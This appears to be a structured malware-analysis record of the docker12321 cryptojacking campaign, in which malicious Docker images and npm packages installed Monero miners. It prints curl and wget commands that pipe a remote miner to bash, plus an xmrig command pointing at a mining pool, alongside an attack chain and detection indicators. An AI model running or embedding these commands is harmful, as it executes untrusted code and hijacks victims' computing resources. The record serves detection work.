package_info.why_malicious: The docker12321 registry hosted multiple malicious Docker images that, when deployed, exploited known vulnerabilities (e.g., in Jenkins, Struts) to install and run cryptocurrency mining malware, hijacking host CPU resources for profit. The images were repeatedly uploaded and distributed to thousands of unsuspecting users, resulting in large-scale cryptojacking operations.

execution_context.file_location: Dockerfile / entrypoint.sh / application startup scripts within docker12321 images

malicious_snippets.code_snippet:
curl -sSL http://malicious-domain/cryptominer | bash
# or
wget http://malicious-domain/cryptominer -O - | bash
# or
./xmrig --url=pool.minexmr.com:4444 --user=<wallet> --pass=x
malicious_snippets.code_behavior: Downloads and executes a cryptominer binary (e.g., xmrig) from a remote server, then starts mining Monero using the host's CPU, sending results to the attacker's wallet.

malice_analysis.why_suspicious: The code downloads and executes binaries from untrusted remote sources at container startup, a common cryptojacking technique.
malice_analysis.violated_expectations: Legitimate containers should not download and execute arbitrary code from the internet at runtime, nor should they mine cryptocurrency.
malice_analysis.similar_legitimate_use: Automated build containers may download dependencies, but not cryptomining software.
key_indicators: Remote code execution via curl/wget piped to shell

execution_context.file_location: Injected via Jenkins/Struts deserialization exploit payloads

malicious_snippets.code_behavior: Executes a Java-based cryptominer on the exploited server, using the server's resources to mine Monero for the attacker.

malice_analysis.why_suspicious: Execution of unapproved binaries via remote code execution exploits is a hallmark of server compromise.
malice_analysis.violated_expectations: Jenkins/Struts servers should not execute arbitrary mining software as a result of deserialization.
malice_analysis.similar_legitimate_use: None; this is always malicious in this context.
key_indicators: Execution of miner.jar or similar binaries
Outbound connections to Monero mining pools

execution_context.file_location: index.js / postinstall script in malicious npm packages

malicious_snippets.code_behavior: During npm install or runtime, executes a shell command to download and run a cryptominer, hijacking the host's CPU.

malice_analysis.why_suspicious: Postinstall scripts that download and execute remote code are a well-known npm malware vector.
malice_analysis.violated_expectations: npm packages should not execute arbitrary shell commands or download cryptominers.
malice_analysis.similar_legitimate_use: Postinstall scripts may be used for legitimate build steps, but not for cryptomining.

attack_chain.action: User deploys a popular Docker image or npm package from docker12321 or related malicious registry.
attack_chain.leads_to: Malicious code executes on container or host.

attack_chain.action: Malicious code downloads and executes cryptominer binary (e.g., xmrig, miner.jar) from attacker's server.
attack_chain.leads_to: Cryptominer runs on host, using CPU resources.

attack_chain.action: Cryptominer connects to Monero mining pool, sending mined currency to attacker's wallet.
In some cases, attacker exploits known vulnerabilities (e.g., Jenkins/Struts deserialization) to gain code execution and deploy miner.

behavioral_signatures: Containers or packages that download and execute remote binaries at startup or install time
Unexpected CPU spikes in containers or servers
Outbound connections to known Monero mining pools
Presence of cryptominer binaries (xmrig, miner.jar, etc.)
file_indicators: entrypoint.sh or Dockerfile lines with curl/wget piped to bash
miner.jar, xmrig, or similar binaries in container filesystem
npm packages with suspicious postinstall scripts
network_indicators: Connections to pool.minexmr.com or other Monero mining pools
Outbound traffic to suspicious domains hosting cryptominer payloads
detection_knowledge.how_to_detect: Monitor for containers or packages that execute remote code downloads at startup or install time. Flag any process spawning cryptominer binaries or making outbound connections to known mining pools. Use file integrity monitoring to detect unauthorized binaries (e.g., xmrig, miner.jar) and scan for suspicious postinstall scripts in npm packages. Alert on abnormal CPU usage patterns in containers or servers, especially when correlated with new image deployments.
